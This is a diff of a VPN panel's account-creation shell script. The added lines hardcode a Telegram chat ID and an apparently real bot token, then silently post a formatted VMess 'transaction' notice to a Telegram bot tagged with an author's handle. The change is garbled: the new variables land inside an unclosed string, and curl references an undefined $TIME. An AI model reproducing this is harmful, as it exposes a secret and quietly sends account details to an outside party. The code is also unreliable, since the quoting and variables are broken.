@@ -98,6 +98,11 @@ OhpSSH=`cat /root/log-install.txt | grep -w "OHP SSH" | cut -d: -f2 | awk '{prin
 OhpDB=`cat /root/log-install.txt | grep -w "OHP DBear" | cut -d: -f2 | awk '{print $1}'`
 OhpOVPN=`cat /root/log-install.txt | grep -w "OHP OpenVPN" | cut -d: -f2 | awk '{print $1}'`
 TRX="
+CHATID="5736569839"
+KEY="6409879237:AAE1vPwbqfiWmRkV-AbCa6-tepM5w5FTGz0"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="Project VPN TUNNELING 
 <code>INFO MASKU -Transaksi</code>
 <code>────────────────────</code>
 <b>  ⚠️TRANSAKSI VMESS WS⚠️      </b>
@@ -111,7 +116,7 @@ TRX="
 <i>Notifikasi Via KLMPK-BOT</i>
 <b>Tele : @Andyyuda</b>
 "
-curl -s --max-time $TIMES -d "chat_id=$CHATIDGC&disable_web_page_preview=1&text=$TRX&parse_mode=html" $URL
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 sleep 1
 clear
 useradd -e `date -d "$masaaktif days" +"%Y-%m-%d"` -s /bin/false -M $Login
